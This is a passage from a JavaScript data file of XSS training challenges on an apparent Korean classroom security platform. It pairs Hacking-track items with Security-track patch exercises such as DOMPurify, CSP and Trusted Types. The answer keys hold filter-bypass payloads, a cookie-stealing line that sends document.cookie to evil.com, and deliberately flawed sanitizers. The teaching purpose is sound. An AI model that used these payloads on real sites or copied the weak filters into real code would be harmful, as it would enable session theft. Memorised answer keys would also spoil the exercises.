    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Medium',
    xp: 190,
    cwe: 'CWE-79',
    answer: "<scr<script>ipt>alert(document.cookie)</scr</script>ipt>",
    flag: 'FLAG{NESTED_TAG_FILTER_BYPASSED}',
    mockUi: {
      urlBar: 'target.local/board/write',
      siteLabel: '📝 자유게시판 글쓰기',
      fieldLabel: '게시글 내용',
      fieldPlaceholder: '내용을 입력하세요...',
      buttonLabel: '등록',
    },
    desc: `이 필터는 <code>&lt;script&gt;</code>와 <code>&lt;/script&gt;</code> 문자열을 딱 한 번씩만 찾아서 빈 문자열로 치환합니다(<code>replace()</code>는 기본적으로 첫 번째로 찾은 것만 바꿉니다). Medium 2에서 배운 대소문자 우회와는 다른 방법이 필요합니다 — 만약 <code>&lt;script&gt;</code> 문자열 중간에 또 다른 <code>&lt;script&gt;</code>를 끼워넣으면, 필터가 안쪽의 것을 지우고 난 뒤 바깥쪽 조각들이 합쳐지면서 완전한 <code>&lt;script&gt;</code> 태그가 다시 만들어집니다.
<div class='code-snippet'>input.replace('&lt;script&gt;', '').replace('&lt;/script&gt;', '') <span style="color:#f87171;">// 각 패턴을 딱 한 번만 제거함</span></div>
예를 들어 <code>&lt;scr&lt;script&gt;ipt&gt;</code> 를 넣으면, 필터가 가운데의 <code>&lt;script&gt;</code>만 지워서 <code>&lt;script&gt;</code>가 다시 만들어집니다. 여는 태그와 닫는 태그 모두 이 방식으로 우회해야 합니다.
👉 열고 닫는 태그 모두에 이 중첩 기법을 적용해서, document.cookie를 alert로 띄우는 페이로드를 직접 구성해서 검색창에 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function sanitize(input) {
  return input.replace('<script>', '').replace('</script>', ''); // 각각 딱 한 번만 제거
}
board.innerHTML = sanitize(userContent);`,
    language: 'javascript',
    hint: "<scr<script>ipt> 형태로 <script> 문자열 안에 또 다른 <script>를 끼워넣으면, 안쪽 것이 지워지면서 바깥 조각이 합쳐져 진짜 태그가 됩니다. 여는 태그(<script>)와 닫는 태그(</script>) 양쪽 모두에 똑같이 적용하세요."
  },
  {
    id: 'xs_h_h_1',
    title: '[고급] SVG 태그를 이용한 XSS',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Hard',
    xp: 250,
    cwe: 'CWE-79',
    answer: '<svg onload=alert(document.domain)>',
    flag: 'FLAG{SVG_ONLOAD_HANDLER_EXPLOITED}',
    mockUi: {
      urlBar: 'target.local/board/write',
      siteLabel: '📝 자유게시판 글쓰기',
      fieldLabel: '게시글 내용',
      fieldPlaceholder: '내용을 입력하세요...',
      buttonLabel: '등록',
    },
    desc: `필터가 <code>&lt;script&gt;</code>, <code>&lt;img&gt;</code> 태그를 모두 차단하고 있지만, <code>&lt;svg&gt;</code> 태그와 그 <code>onload</code> 이벤트 핸들러까지는 미처 막지 못했습니다. 이렇게 알려지지 않은 태그/속성 조합을 찾아내는 것이 실전 필터 우회의 핵심입니다.
<div class='code-snippet'>const blocked = ['script', 'img'];<br>blocked.some(tag =&gt; input.includes('&lt;'+tag)) ? drop(input) : render(input);</div>
👉 svg 태그의 onload 핸들러로 document.domain을 alert하는 페이로드를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `const blocked = ['script', 'img'];
function sanitize(input) {
  return blocked.some(tag => input.toLowerCase().includes('<' + tag)) ? '' : input;
}
board.innerHTML = sanitize(userContent);`,
    language: 'javascript',
    hint: '차단 목록(script, img)에 없는 다른 HTML 태그 중, 로드되는 순간 자동으로 실행되는 이벤트 핸들러(onload)를 가진 태그를 찾아보세요.'
  },
  {
    id: 'xs_h_h_2',
    title: '[고급] javascript: URI 스킴을 이용한 XSS',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Hard',
    xp: 260,
    cwe: 'CWE-79',
    answer: 'javascript:alert(document.cookie)',
    flag: 'FLAG{JAVASCRIPT_URI_SCHEME_XSS}',
    mockUi: {
      urlBar: 'target.local/board/link',
      siteLabel: '🔗 게시판 바로가기 링크 등록',
      fieldLabel: '바로가기 링크 (URL)',
      fieldPlaceholder: 'https://...',
      buttonLabel: '등록',
    },
    desc: `이번엔 태그 자체가 아니라 속성값을 노립니다. 게시판이 사용자가 입력한 링크를 앵커(a) 태그의 href 속성에 그대로 넣어주는데, <code>&lt;script&gt;</code> 태그와 <code>on</code>으로 시작하는 이벤트 핸들러 속성은 모두 걸러내지만 href 속성 값 자체는 검증하지 않습니다.
<div class='code-snippet'>&lt;a href="<span style="color:#f87171;">[여러분이 등록한 링크]</span>"&gt;바로가기&lt;/a&gt;</div>
HTML의 href 속성은 일반적인 http(s):// 뿐 아니라 <code>javascript:</code> 라는 특수한 스킴(scheme)도 받아들입니다. 이 스킴으로 시작하면, 링크를 클릭하는 순간 그 뒤에 오는 코드가 그대로 실행됩니다.
<br><br>👉 아래 링크 등록 칸에, 클릭 시 document.cookie를 alert로 띄우는 링크를 직접 구성해서 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function sanitize(input) {
  return input.replace(/<script.*?>.*?<\\/script>/gi, '').replace(/on\\w+=/gi, '');
}
board.innerHTML = \`<a href="\${sanitize(userLink)}">바로가기</a>\`;`,
    language: 'javascript',
    hint: 'HTML 앵커 태그의 href 속성은 http(s):// 뿐 아니라 코드를 실행시키는 특수한 스킴도 받아들입니다. script 태그나 이벤트 핸들러가 아닌, href 값 자체로 실행되는 방식을 찾아보세요.'
  },
  {
    id: 'xs_h_h_3',
    title: '[고급] 속성 탈출과 대소문자 우회의 결합',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Hard',
    xp: 270,
    cwe: 'CWE-79',
    answer: '"><ScRiPt>alert(document.cookie)</sCrIpT>',
    flag: 'FLAG{ATTR_ESCAPE_CASE_BYPASS_COMBO}',
    mockUi: {
      urlBar: 'target.local/search',
      siteLabel: '🔍 상품 검색 (강화된 필터)',
      fieldLabel: '검색어',
      fieldPlaceholder: '검색어를 입력하세요',
      buttonLabel: '검색',
    },
    desc: `Tutorial의 두 번째 문제(HTML 속성 탈출)와 Medium의 대소문자 우회 기법을 이번엔 동시에 써야 합니다. 검색어는 여전히 <code>&lt;input&gt;</code> 태그의 value 속성 안에 그대로 삽입되고, 이번엔 필터까지 추가되어 소문자 <code>&lt;script&gt;</code> 태그를 정확히 찾아 제거합니다.
<div class='code-snippet'>&lt;input type="text" name="search" value="<span style="color:#f87171;">[여러분이 입력한 검색어]</span>"&gt;<br>// 필터: input.replace('&lt;script&gt;', '').replace('&lt;/script&gt;', '')</div>
👉 먼저 Tutorial에서 배운 방식으로 속성값 밖으로 탈출한 뒤, 곧바로 Medium에서 배운 대소문자를 섞은 스크립트 태그를 이어붙여서 document.cookie를 alert로 띄우는 페이로드를 검색창에 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function sanitize(input) {
  return input.replace('<script>', '').replace('</script>', '');
}
board.innerHTML = \`<input type="text" name="search" value="\${sanitize(userInput)}">\`;`,
    language: 'html',
    hint: '먼저 큰따옴표(")와 >로 value 속성과 input 태그를 닫아 밖으로 나온 뒤, 이어서 script 태그의 알파벳 대소문자를 섞어서 작성해 필터를 우회하세요.'
  },
  {
    id: 'xs_h_h_4',
    title: '[고급] 속성 탈출과 중첩 태그 우회의 결합',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Hard',
    xp: 275,
    cwe: 'CWE-79',
    answer: '"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>',
    flag: 'FLAG{ATTR_ESCAPE_NESTED_TAG_COMBO}',
    mockUi: {
      urlBar: 'target.local/search',
      siteLabel: '🔍 상품 검색 (강화된 필터)',
      fieldLabel: '검색어',
      fieldPlaceholder: '검색어를 입력하세요',
      buttonLabel: '검색',
    },
    desc: `Tutorial의 두 번째 문제(HTML 속성 탈출)와 Medium에서 배운 중첩 태그 필터 우회를 이번엔 동시에 써야 합니다. 검색어는 여전히 <code>&lt;input&gt;</code> 태그의 value 속성 안에 그대로 삽입되고, 이번엔 필터까지 추가되어 <code>&lt;script&gt;</code>, <code>&lt;/script&gt;</code> 문자열을 각각 딱 한 번만 제거합니다.
<div class='code-snippet'>&lt;input type="text" name="search" value="<span style="color:#f87171;">[여러분이 입력한 검색어]</span>"&gt;<br>// 필터: input.replace('&lt;script&gt;', '').replace('&lt;/script&gt;', '')</div>
👉 먼저 Tutorial에서 배운 방식으로 속성값 밖으로 탈출한 뒤, 곧바로 Medium에서 배운 중첩 태그 기법으로 필터를 우회하는 스크립트 태그를 이어붙여서 document.cookie를 alert로 띄우는 페이로드를 검색창에 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function sanitize(input) {
  return input.replace('<script>', '').replace('</script>', '');
}
board.innerHTML = \`<input type="text" name="search" value="\${sanitize(userInput)}">\`;`,
    language: 'html',
    hint: '먼저 큰따옴표(")와 >로 value 속성과 input 태그를 닫아 밖으로 나온 뒤, 이어서 Medium에서 배운 <scr<script>ipt> 중첩 기법으로 필터를 우회하는 스크립트 태그를 이어붙이세요.'
  },
  {
    id: 'xs_h_h_5',
    title: '[고급] postMessage DOM XSS와 필터 우회의 결합',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Hard',
    xp: 280,
    cwe: 'CWE-79',
    answer: "<scr<script>ipt>document.location='https://evil.com/steal?c='+document.cookie</scr</script>ipt>",
    flag: 'FLAG{POSTMESSAGE_FILTER_BYPASS_COMBO}',
    desc: `Medium에서 배운 postMessage DOM XSS 소스에, 이번엔 <code>&lt;script&gt;</code> 문자열을 걸러내는 필터까지 추가되었습니다. Medium에서 배운 중첩 태그 우회 기법을 그대로 적용해야 합니다.
<div class='code-snippet'>window.addEventListener('message', (e) =&gt; {<br>&nbsp;&nbsp;const clean = e.data.replace('&lt;script&gt;', '').replace('&lt;/script&gt;', '');<br>&nbsp;&nbsp;document.getElementById('content').innerHTML = clean;<br>});</div>
👉 Medium에서 쓴 쿠키 탈취 페이로드(<code>document.location='https://evil.com/steal?c='+document.cookie</code>)를, 이번엔 중첩 태그 기법으로 필터를 우회하는 <code>&lt;script&gt;</code> 태그 안에 담아서 postMessage로 보낼 데이터를 직접 구성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `window.addEventListener('message', (e) => {
  const clean = e.data.replace('<script>', '').replace('</script>', ''); // 각각 한 번만 제거
  document.getElementById('content').innerHTML = clean;
});`,
    language: 'javascript',
    hint: "Medium의 <scr<script>ipt>...</scr</script>ipt> 중첩 구조 안에, 같은 Medium에서 쓴 document.location='https://evil.com/steal?c='+document.cookie 코드를 그대로 넣으면 됩니다."
  },
  {
    id: 'xs_s_e_1',
    title: '[실전 Level 1] React 위험한 HTML 삽입(dangerouslySetInnerHTML) 제거 패치',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-79',
    answer: '<div>{comment.text}</div>',
    flag: 'FLAG{REACT_AUTO_ESCAPE_RESTORED}',
    desc: `🌟 <b>어떤 상황인가요? (방패 해제 비유)</b><br>
리액트(React)는 기본적으로 <code>{변수}</code> 처럼 중괄호로 값을 출력하면 XSS 공격을 100% 자동으로 막아주는 든든한 방패를 제공해요.<br>
하지만 이름부터 위험한 <code>dangerouslySetInnerHTML</code> 을 쓰면 스스로 그 방패를 꺼버려서 사이트가 위험에 빠집니다!

🔍 <b>보안 패치의 핵심</b><br>
위험한 속성을 지우고, 그냥 리액트 본래의 안전한 중괄호 렌더링 <code>&lt;div&gt;{comment.text}&lt;/div&gt;</code> 로 되돌려주기만 하면 끝납니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 안전한 기본 리액트 렌더링 코드를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">&lt;div&gt;{comment.text}&lt;/div&gt;</code>`,
    code: `// 취약한 코드: 리액트 자체 보안 방패를 끄고 원본 HTML을 삽입
<div dangerouslySetInnerHTML={{ __html: comment.text }} />

// [보안 패치: 안전한 일반 중괄호 바인딩으로 교체]`,
    language: 'jsx',
    hint: "정답은 [<div>{comment.text}</div>] 입니다. dangerously 속성을 지우고 중괄호로 감싸세요."
  },
  {
    id: 'xs_s_e_2',
    title: '[실전 Level 1] DOMPurify 라이브러리로 사용자 입력 살균 패치',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Easy',
    xp: 120,
    cwe: 'CWE-79',
    answer: "const clean = DOMPurify.sanitize(userHtml);",
    flag: 'FLAG{DOMPURIFY_SANITIZE_APPLIED}',
    desc: `🌟 <b>어떤 상황인가요? (소독기 비유)</b><br>
사용자가 글자 굵게(<code>&lt;b&gt;</code>)나 링크(<code>&lt;a&gt;</code>) 같은 HTML 서식을 꼭 써야 하는 블로그 게시판이 있어요.<br>
이럴 땐 무작정 다 막을 수 없으니, <b>전문 소독기(DOMPurify 라이브러리)</b>를 거쳐 위험한 악성 스크립트만 깨끗하게 씻어내야 합니다!

🔍 <b>보안 패치의 핵심</b><br>
<code>DOMPurify.sanitize(userHtml)</code> 한 줄이면 모든 악성 태그와 위험한 이벤트 핸들러가 자동으로 걸러집니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 DOMPurify 살균 코드 한 줄을 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">const clean = DOMPurify.sanitize(userHtml);</code>`,
    code: `// 취약한 코드: 살균하지 않고 위험한 원본 HTML을 화면에 삽입
board.innerHTML = userHtml;

// [보안 패치: DOMPurify.sanitize()로 소독 후 삽입]`,
    language: 'javascript',
    hint: "정답은 [const clean = DOMPurify.sanitize(userHtml);] 입니다. 복사해서 터미널 창에 붙여넣어 보세요!"
  },
  {
    id: 'xs_s_e_3',
    title: '[실전 Level 1] Vue.js v-html 대신 이중 중괄호({{ }}) 자동 이스케이프 패치',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Easy',
    xp: 115,
    cwe: 'CWE-79',
    answer: "<div>{{ comment.text }}</div>",
    flag: 'FLAG{VUE_MUSTACHE_AUTOESCAPE_RESTORED}',
    desc: `🌟 <b>어떤 상황인가요?</b><br>
Vue.js 프레임워크에서도 <code>v-html</code> 디렉티브를 쓰면 원본 HTML이 그대로 렌더링되어 해킹당합니다.<br>
Vue의 기본 이중 중괄호(<code>{{ 변수 }}</code>)를 쓰면 브라우저가 특수문자를 자동으로 안전하게 이스케이프해 줍니다.

🔍 <b>보안 패치의 핵심</b><br>
<code>&lt;div v-html="..."&gt;</code> 대신 <code>&lt;div&gt;{{ comment.text }}&lt;/div&gt;</code> 로 바꿔주면 XSS가 원천 차단됩니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 안전한 Vue mustache 렌더링 코드를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">&lt;div&gt;{{ comment.text }}&lt;/div&gt;</code>`,
    code: `<!-- 취약한 코드: 검증 없는 원본 HTML 렌더링 -->
<div v-html="comment.text"></div>

<!-- [보안 패치: 자동 이스케이프되는 이중 중괄호로 교체] -->`,
    language: 'html',
    hint: "정답은 [<div>{{ comment.text }}</div>] 입니다. 이중 중괄호({{ }}) 안에 comment.text를 넣으세요."
  },
  {
    id: 'xs_s_e_4',
    title: '[실전 Level 1] MIME 스니핑 방지 헤더(nosniff) 설정 패치',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-79',
    answer: "X-Content-Type-Options: nosniff",
    flag: 'FLAG{MIME_SNIFFING_BLOCKED}',
    desc: `🌟 <b>어떤 상황인가요? (위장 상자 비유)</b><br>
사용자가 이미지 파일(PNG)을 업로드했는데, 그 안에 악성 자바스크립트를 교묘하게 숨겨둘 수 있어요.<br>
이때 브라우저가 쓸데없이 오지랖을 부려 "어? 이미지라고 적혀 있지만 내용물이 코드 같네? 코드로 실행해야지!(MIME 스니핑)" 하고 제멋대로 판단하면 해킹이 터집니다!

🔍 <b>보안 패치의 핵심: 제멋대로 추측 금지(nosniff)</b><br>
서버가 <code>X-Content-Type-Options: nosniff</code> 헤더를 보내면, 브라우저에게 <b>"너 멋대로 내용물 추측하지 말고 서버가 정해준 형식 그대로만 열어!"</b>라고 강력히 명령하여 위장 XSS를 차단합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 nosniff 헤더 설정값을 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">X-Content-Type-Options: nosniff</code>`,
    code: `// 취약점: 브라우저가 이미지 파일 속 HTML/JS 코드를 멋대로 스니핑해서 실행할 위험
res.setHeader('Content-Type', 'image/png');

// [보안 패치: MIME 스니핑 원천 금지 헤더 추가]`,
    language: 'http',
    hint: "정답은 [X-Content-Type-Options: nosniff] 입니다. 콜론(:) 뒤에 한 칸 띄우고 nosniff를 적으세요."
  },
  {
    id: 'xs_s_m_1',
    title: '[패치] Content-Security-Policy 헤더 설정',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Medium',
    xp: 170,
    cwe: 'CWE-79',
    answer: "Content-Security-Policy: script-src 'self'",
    flag: 'FLAG{CSP_SCRIPT_SRC_SELF_ENFORCED}',
    desc: `설령 XSS 페이로드가 페이지에 삽입되더라도, 브라우저가 스크립트 실행 자체를 차단하도록 만드는 마지막 방어선이 CSP(Content-Security-Policy) 헤더입니다. 인라인 스크립트와 외부 출처 스크립트를 막고 우리 서버(self)에서 제공하는 스크립트만 허용하는 헤더를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `// 응답 헤더에 CSP가 설정되어 있지 않아
// 인라인 <script>나 외부 출처 스크립트가 자유롭게 실행됨

// [패치 필요: script-src 'self' 를 지정하는 CSP 헤더 추가]`,
    language: 'http',
    hint: "Content-Security-Policy: script-src 'self' 헤더를 응답에 추가하세요."
  },
  {
    id: 'xs_s_m_2',
    title: '[패치] innerHTML 대신 textContent 사용',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Medium',
    xp: 160,
    cwe: 'CWE-79',
    answer: "el.textContent = userInput;",
    flag: 'FLAG{TEXTCONTENT_SAFE_RENDERING}',
    desc: `순수 텍스트만 표시하면 되는 자리라면, HTML로 파싱되는 <code>innerHTML</code> 대신 문자 그대로만 출력하는 <code>textContent</code>를 사용하는 것이 가장 간단하고 확실한 방어입니다.
<br><br>👉 innerHTML을 textContent로 교체하는 코드를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `// 취약한 코드
el.innerHTML = userInput;

// [패치 필요: textContent로 교체]`,
    language: 'javascript',
    hint: "el.innerHTML 대신 el.textContent에 값을 대입하세요."
  },
  {
    id: 'xs_s_m_3',
    title: '[패치] SameSite 쿠키 속성으로 XSS 피해 최소화',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Medium',
    xp: 175,
    cwe: 'CWE-79',
    answer: "Set-Cookie: session_id=123; HttpOnly; SameSite=Strict",
    flag: 'FLAG{SAMESITE_COOKIE_HARDENED}',
    desc: `Tutorial에서 HttpOnly로 자바스크립트가 쿠키를 직접 읽지 못하게 막았습니다. 그런데 XSS 페이로드가 <code>fetch()</code>로 요청을 보낼 땐 브라우저가 쿠키를 자동으로 함께 실어 보내기 때문에, HttpOnly만으로는 완전히 막지 못하는 경우가 있습니다. <code>SameSite</code> 속성을 추가하면, 다른 출처(공격자 사이트 등)에서 시작된 요청에는 이 쿠키를 아예 실어 보내지 않도록 브라우저 차원에서 막을 수 있습니다.
<div class='code-snippet'>Set-Cookie: session_id=123; HttpOnly<span style="color:#f87171;"> (SameSite 속성 없음)</span></div>
👉 HttpOnly는 유지하면서, 가장 엄격한 <code>Strict</code> 옵션의 SameSite 속성까지 추가한 Set-Cookie 헤더 전체를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `// 기존 헤더 (HttpOnly만 적용됨)
Set-Cookie: session_id=123; HttpOnly

// [패치 필요: SameSite=Strict 추가]`,
    language: 'http',
    hint: "기존 HttpOnly 뒤에 세미콜론으로 이어서 SameSite=Strict 를 추가하면 됩니다."
  },
  {
    id: 'xs_s_m_4',
    title: '[패치] postMessage 발신 출처(origin) 검증 추가',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Medium',
    xp: 175,
    cwe: 'CWE-79',
    answer: "if (e.origin !== 'https://trusted.local') return;",
    flag: 'FLAG{POSTMESSAGE_ORIGIN_VALIDATED}',
    desc: `Hacking 트랙에서 본 것처럼, <code>postMessage</code> 이벤트 리스너가 메시지를 보낸 출처(<code>e.origin</code>)를 전혀 검증하지 않으면 어떤 페이지든 임의의 데이터를 주입할 수 있습니다. 신뢰할 수 있는 출처의 메시지만 처리하도록 검증을 추가해야 합니다.
<div class='code-snippet'>window.addEventListener('message', (e) =&gt; {<br>&nbsp;&nbsp;<span style="color:#f87171;">// e.origin 검증 없음</span><br>&nbsp;&nbsp;document.getElementById('content').innerHTML = e.data;<br>});</div>
👉 이 애플리케이션의 신뢰할 수 있는 출처가 <code>https://trusted.local</code> 라고 할 때, 그 출처가 아니면 즉시 함수를 종료(return)하는 검증 코드 한 줄을 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `window.addEventListener('message', (e) => {
  // [패치 필요: e.origin 검증 추가]
  document.getElementById('content').innerHTML = e.data;
});`,
    language: 'javascript',
    hint: "if (e.origin !== '신뢰할 출처') return; 형태로, 리스너 함수 맨 앞에 출처 검증을 추가하세요."
  },
  {
    id: 'xs_s_m_5',
    title: '[패치] 전역(global) 정규식으로 중첩 태그 우회 차단',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Medium',
    xp: 180,
    cwe: 'CWE-79',
    answer: "return input.replace(/<script>/gi, '').replace(/<\\/script>/gi, '');",
    flag: 'FLAG{GLOBAL_REGEX_NESTED_BYPASS_BLOCKED}',
    desc: `Hacking 트랙에서 본 것처럼, <code>.replace('&lt;script&gt;', '')</code>는 문자열이든 정규식이든 <b>딱 한 번</b>만 치환합니다(정규식에 <code>g</code> 플래그가 없으면). 그래서 <code>&lt;scr&lt;script&gt;ipt&gt;</code>처럼 태그를 중첩시키면, 안쪽 것만 지워지고 바깥 조각이 합쳐져 진짜 태그가 다시 만들어집니다.
<div class='code-snippet'>function sanitize(input) {<br>&nbsp;&nbsp;return input.replace('&lt;script&gt;', '').replace('&lt;/script&gt;', ''); <span style="color:#f87171;">// 각각 딱 한 번만 치환</span><br>}</div>
👉 문자열 대신 <code>g</code>(전역) 플래그를 가진 정규식으로 바꿔서, 일치하는 <b>모든</b> occurrence를 반복적으로 제거하는 코드를 작성하십시오. (대소문자 우회까지 함께 막도록 <code>i</code> 플래그도 추가하십시오.) 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function sanitize(input) {
  return input.replace('<script>', '').replace('</script>', ''); // 취약: 한 번만 치환됨
}
board.innerHTML = sanitize(userContent);`,
    language: 'javascript',
    hint: "input.replace(/<script>/gi, '') 처럼 문자열 대신 정규식을 쓰고, g(전역) + i(대소문자 무시) 플래그를 붙이세요. 여는 태그와 닫는 태그 모두 같은 방식으로 처리해야 합니다."
  },
  {
    id: 'xs_s_h_1',
    title: '[고급 패치] 템플릿 엔진 auto-escape 강제',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Hard',
    xp: 240,
    cwe: 'CWE-79',
    answer: '<%= comment.text %>',
    flag: 'FLAG{EJS_AUTO_ESCAPE_TAG_RESTORED}',
    desc: `EJS 템플릿 엔진에서 <code>&lt;%- %&gt;</code>(raw 출력)와 <code>&lt;%= %&gt;</code>(자동 이스케이프 출력)는 완전히 다르게 동작합니다. 개발자가 실수로 raw 출력 태그를 사용하면 사용자 입력이 이스케이프 없이 그대로 HTML로 렌더링됩니다.
<div class='code-snippet'>&lt;div class="comment"&gt;<span style="color:#f87171;">&lt;%- comment.text %&gt;</span>&lt;/div&gt;</div>
👉 자동으로 HTML 이스케이프를 적용하는 EJS 출력 태그로 교체하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `<!-- 취약한 템플릿: raw 출력 태그 -->
<div class="comment"><%- comment.text %></div>

<!-- [패치 필요: 자동 이스케이프 태그로 교체] -->`,
    language: 'html',
    hint: "<%- %> (raw) 대신 <%= %> (auto-escape) 태그를 사용하세요."
  },
  {
    id: 'xs_s_h_2',
    title: '[고급 패치] Trusted Types로 DOM XSS 싱크 원천 차단',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Hard',
    xp: 245,
    cwe: 'CWE-79',
    answer: "Content-Security-Policy: require-trusted-types-for 'script'",
    flag: 'FLAG{TRUSTED_TYPES_ENFORCED}',
    desc: `필터링이나 이스케이프를 아무리 꼼꼼히 해도, 개발자가 실수로 <code>innerHTML</code> 같은 위험한 DOM Sink에 검증되지 않은 순수 문자열을 대입하는 순간 뚫릴 수 있습니다. 최신 브라우저는 이런 실수 자체를 원천 차단하는 Trusted Types라는 기능을 제공합니다 — 이 기능을 강제하면, 검증되지 않은 순수 문자열이 innerHTML 등에 대입되는 순간 브라우저가 예외를 던지고 막아버립니다.
<div class='code-snippet'>el.innerHTML = untrustedString; <span style="color:#f87171;">// Trusted Types 강제 시 브라우저가 예외를 던지고 차단함</span></div>
👉 <code>script</code> 컨텍스트에 대해 Trusted Types를 강제하는 CSP 헤더를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `// 응답 헤더에 Trusted Types 강제 설정이 없어
// innerHTML 등에 순수 문자열을 대입하는 실수가 그대로 통과됨

// [패치 필요: require-trusted-types-for 지시어를 포함한 CSP 헤더 추가]`,
    language: 'http',
    hint: "Content-Security-Policy 헤더에 require-trusted-types-for 지시어를 추가하고, 대상으로 'script' 를 작은따옴표로 감싸서 지정하세요."
  },
  {
    id: 'xs_s_h_3',
    title: '[고급 패치] 정규식 필터를 걷어내고 DOMPurify로 근본 해결',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Hard',
    xp: 250,
    cwe: 'CWE-79',
    answer: "board.innerHTML = DOMPurify.sanitize(userContent);",
    flag: 'FLAG{REGEX_FILTER_REPLACED_WITH_DOMPURIFY}',
    desc: `Hacking 트랙에서 본 것처럼, 직접 짠 정규식/문자열 치환 필터는 아무리 정교하게 다듬어도 중첩 태그, 대소문자 혼용 같은 우회 기법에 계속 뚫립니다. 이런 "블랙리스트 문자열 치환" 방식 자체가 근본적으로 안전하지 않습니다. Easy에서 배운 것처럼, 실제 HTML 파서를 이용해 안전한 태그만 남기고 위험한 것은 제거하는 검증된 라이브러리(DOMPurify)로 완전히 교체하는 것이 근본적인 해결책입니다.
<div class='code-snippet'>function sanitize(input) {<br>&nbsp;&nbsp;return input.replace(/&lt;script&gt;/gi, '').replace(/&lt;\\/script&gt;/gi, ''); <span style="color:#f87171;">// 아무리 정교해도 우회 기법이 계속 발견됨</span><br>}<br>board.innerHTML = sanitize(userContent);</div>
👉 직접 짠 정규식 필터 함수를 완전히 걷어내고, <code>DOMPurify.sanitize()</code>로 교체한 코드를 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function sanitize(input) {
  return input.replace(/<script>/gi, '').replace(/<\\/script>/gi, ''); // 계속 우회당하는 블랙리스트 필터
}
board.innerHTML = sanitize(userContent);
// [패치 필요: sanitize() 함수를 걷어내고 DOMPurify.sanitize()로 교체]`,
    language: 'javascript',
    hint: "Easy에서 배운 DOMPurify.sanitize(userContent) 결과를 board.innerHTML에 바로 대입하세요. 직접 만든 정규식 필터 함수는 완전히 걷어냅니다."
  },
  {
    id: 'xs_s_h_4',
    title: '[고급 패치] postMessage 종합 방어 — 출처 검증과 DOMPurify 결합',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Hard',
    xp: 255,
    cwe: 'CWE-79',
    answer: "if (e.origin !== 'https://trusted.local') return; document.getElementById('content').innerHTML = DOMPurify.sanitize(e.data);",
    flag: 'FLAG{POSTMESSAGE_FULL_DEFENSE_COMBINED}',
    desc: `Medium에서 배운 출처(origin) 검증과 이전 Hard에서 배운 DOMPurify 교체, 두 방어를 모두 갖춰야 postMessage 기반 DOM XSS를 완전히 막을 수 있습니다. 출처 검증만 하면 신뢰할 출처가 실수로(또는 그 출처 자체가 뚫려서) 위험한 데이터를 보낼 경우에 취약하고, DOMPurify만 쓰면 애초에 아무 출처나 메시지를 보낼 수 있다는 문제가 남습니다.
<div class='code-snippet'>window.addEventListener('message', (e) =&gt; {<br>&nbsp;&nbsp;<span style="color:#f87171;">// 출처 검증도 없고, 살균 처리도 없음</span><br>&nbsp;&nbsp;document.getElementById('content').innerHTML = e.data;<br>});</div>
👉 신뢰할 출처(<code>https://trusted.local</code>)가 아니면 즉시 종료하는 검증과, 통과한 데이터도 <code>DOMPurify.sanitize()</code>로 살균한 뒤 삽입하는 코드를 모두 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `window.addEventListener('message', (e) => {
  // [패치 필요: 출처 검증 + DOMPurify 살균 모두 추가]
  document.getElementById('content').innerHTML = e.data;
});`,
    language: 'javascript',
    hint: "Medium에서 배운 if (e.origin !== 'https://trusted.local') return; 검증과, Hard에서 배운 DOMPurify.sanitize(e.data) 를 innerHTML 대입에 함께 사용하세요."
  },

  // --- Other Categories (Memory, Crypto, Network, Web, Forensic, Reversing) ---
  // 각 카테고리마다 Tutorial → Easy → Medium → Hard 순으로 난이도가 점진적으로 올라가도록 구성 (100명 규모 수업 대응)
  {
    id: 'mem_t_1',
